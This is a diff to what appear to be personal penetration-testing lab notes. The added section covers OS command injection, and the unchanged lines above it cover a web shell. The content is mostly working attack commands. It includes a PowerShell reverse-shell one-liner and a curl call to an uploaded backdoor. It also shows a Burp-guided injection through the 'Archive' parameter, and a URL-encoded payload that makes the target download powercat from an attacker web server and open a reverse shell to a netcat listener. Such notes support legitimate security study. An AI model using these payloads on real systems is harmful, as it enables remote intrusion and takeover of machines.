@@ -206,3 +206,17 @@ $Text = '$client = New-Object System.Net.Sockets.TCPClient("192.168.119.3",4444)
   - Then encode: ```$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)``` > ```$EncodedText =[Convert]::ToBase64String($Bytes)``` > ```$EncodedText```
   - Exit PowerShell with ```exit```
   - Send it with curl: ```curl http://192.168.50.189/meteor/uploads/simple-backdoor.pHP?cmd=powershell%20-enc%20<encoded>```
+
+## OS Command Injection
+
+- Turn on Burp: ```burpsuite```
+- Send valid command and find the POST in Burp
+- Note the parameter where the command is executed from
+- Send arbitrary commands through the GUI like ```ifconfig``` or ```ipconfig```
+  - or through a curl: ```curl -X POST --data 'Archive=ipconfig' http://192.168.50.189:8000/archive```
+- Find suitable command struture and exploit... for instance:
+  - ```curl -X POST --data 'Archive=git%3Bipconfig' http://192.168.50.189:8000/archive``` << using the git command and abusing it with URL encoding
+  - Using Powercat to create the reverse shell: ```cp /usr/share/powershell-empire/empire/server/data/module_source/management/powercat.ps1```
+  - Using a webserver to serve up: ```python3 -m http.server 80```
+  - Establish the netcat listener to hold the shell: ```nc -nvlp 4444```
+  - Download Powercat from our webserver and load up the reverse shell (with URL encoding): ```curl -X POST --data 'Archive=git%3BIEX%20(New-Object%20System.Net.Webclient).DownloadString(%22http%3A%2F%2F192.168.119.3%2Fpowercat.ps1%22)%3Bpowercat%20-c%20192.168.119.3%20-p%204444%20-e%20powershell' http://192.168.50.189:8000/archive```
